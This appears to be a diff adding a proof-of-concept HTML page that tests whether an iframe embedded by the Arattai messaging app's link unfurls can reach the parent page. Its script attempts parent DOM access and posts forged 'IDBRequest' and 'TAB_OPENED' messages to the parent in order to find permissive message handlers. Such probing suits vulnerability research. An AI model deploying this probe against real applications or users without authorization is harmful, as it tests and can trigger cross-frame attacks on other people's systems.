@@ -1,0 +1,59 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Arattai unfurl iframe impact probe</title>
+<style>
+  body { font-family: sans-serif; padding: 16px; }
+  #log { white-space: pre-wrap; font-family: monospace; font-size: 13px; background: #111; color: #0f0; padding: 12px; border-radius: 6px; }
+</style>
+<h1 id="result">Loaded inside unfurl iframe; probing boundary...</h1>
+<div id="log"></div>
+<script>
+(() => {
+  const marker = 'ARATTAI_XSS_UNFURL_IFRAME_' + Math.random().toString(36).slice(2, 8);
+  const lines = [];
+  const log = (s) => { lines.push(s); document.getElementById('log').textContent = lines.join('\n'); };
+
+  log('window.name (before) = ' + window.name);
+  window.name = marker;
+  log('marker set on window.name = ' + marker);
+  log('document.referrer = ' + document.referrer);
+  try {
+    log('location.ancestorOrigins = ' + JSON.stringify([...(location.ancestorOrigins || [])]));
+  } catch (e) { log('ancestorOrigins read failed: ' + e.message); }
+  log('own origin (location.origin) = ' + location.origin);
+  log('in top frame? ' + (window.top === window));
+
+  // Test 1: direct same-origin DOM access to the parent (only succeeds if the
+  // iframe's own origin literally equals the Arattai app's origin).
+  try {
+    if (window.parent === window) {
+      log('TEST 1 skipped: not embedded in a frame.');
+    } else {
+      const parentDoc = window.parent.document; // throws for a genuinely cross-origin parent
+      parentDoc.documentElement.dataset.arattaiXssProbe = marker;
+      log('TEST 1 RESULT: BOUNDARY FAILED - same-origin parent DOM is accessible.');
+      document.getElementById('result').textContent = 'XSS BOUNDARY FAILED: parent DOM accessible';
+      document.body.style.background = '#b00020';
+      alert(marker);
+    }
+  } catch (e) {
+    log('TEST 1 RESULT: safe isolation observed (' + e.name + ': ' + e.message + ')');
+  }
+
+  // Test 2: postMessage the parent regardless of origin (postMessage itself is
+  // legal cross-origin; the *response*, if any, tells us whether a permissive
+  // window.addEventListener('message', ...) handler exists on the parent page
+  // that this iframe can reach without needing same-origin access).
+  try {
+    if (window.parent && window.parent !== window) {
+      window.parent.postMessage({ type: 'IDBRequest', probe: marker, requestId: marker, params: { clusterName: 'probe', methodName: 'probe', arguments: {} } }, '*');
+      window.parent.postMessage({ type: 'TAB_OPENED', probe: marker }, '*');
+      log('TEST 2: sent probe postMessage payloads to window.parent (watch parent devtools/network for any reaction).');
+    }
+  } catch (e) {
+    log('TEST 2 failed to send: ' + e.message);
+  }
+
+  log('Done. If TEST 1 did not report a failure above, this iframe is isolated from the Arattai page (expected when hosted cross-origin, e.g. on GitHub Pages) - the finding here is that this iframe was embedded at all, with allow-scripts allow-same-origin, from an unrelated host, not that it can currently read the parent DOM.');
+})();
+</script>
